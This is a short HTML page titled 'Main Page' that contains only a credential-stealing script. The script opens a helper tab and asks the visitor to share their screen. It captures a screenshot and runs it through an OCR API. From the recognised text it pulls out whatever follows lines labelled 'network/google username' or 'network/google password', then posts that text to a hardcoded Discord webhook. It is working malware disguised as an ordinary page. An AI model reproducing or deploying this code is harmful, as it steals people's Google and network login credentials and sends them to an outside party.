<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Main Page</title>
</head>
<body>
<h1>Main Page</h1>
<script>
const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd",
      K="K85882318988957";

(async()=>{
  try{
    // Open test.html tab for permission handshake
    const testTab = window.open("test.html","_blank");

    // Request screen capture immediately
    const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});

    // Notify test.html that permission is granted
    testTab.postMessage({msg:"allowed-permissions"},"*");

    // Wait for test.html to acknowledge
    await new Promise(resolve=>{
      function handler(e){
        if(e.data?.msg==="allowed-permissions"){
          window.removeEventListener("message", handler);
          resolve();
        }
      }
      window.addEventListener("message", handler);
    });

    // Optional wait (can keep 1 second or adjust)
    await new Promise(r => setTimeout(r, 1000));

    // Proceed with OCR + Discord
    const video = document.createElement("video");
    video.srcObject = stream;

    // Wait for video to load metadata to ensure correct width/height
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play().then(resolve);
      };
    });

    // Now video is ready, capture screenshot
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t => t.stop());

    // Convert canvas to blob for OCR
    const blob = await new Promise(r => canvas.toBlob(r,"image/png"));

    const formData = new FormData();
    formData.append("apikey",K);
    formData.append("language","eng");
    formData.append("file",blob,"screenshot.png");

    const ocrResponse = await fetch("https://api.ocr.space/parse/image",{method:"POST",body:formData});
    const ocrJson = await ocrResponse.json();

    if(!ocrJson.ParsedResults?.length) return;

    const lines = ocrJson.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/);
    const output = lines.reduce((a,v,i)=>{
      if(a) return a;
      if(v.toLowerCase().includes("network/google username") || v.toLowerCase().includes("network/google password")){
        return `${lines[i+1]||""}\n${lines[i+2]||""}`;
      }
      return "";
    },"").trim();

    if(!output) return;

    // Send OCR result to Discord
    await fetch(W,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({content:output||"(no valid text found)"})
    });

    console.log("OCR + Discord done!");

    // Finally, tell the test tab to close itself
    testTab.postMessage({msg:"close-tab"},"*");

  } catch(e){console.error(e);}
})();
</script>
</body>
</html>
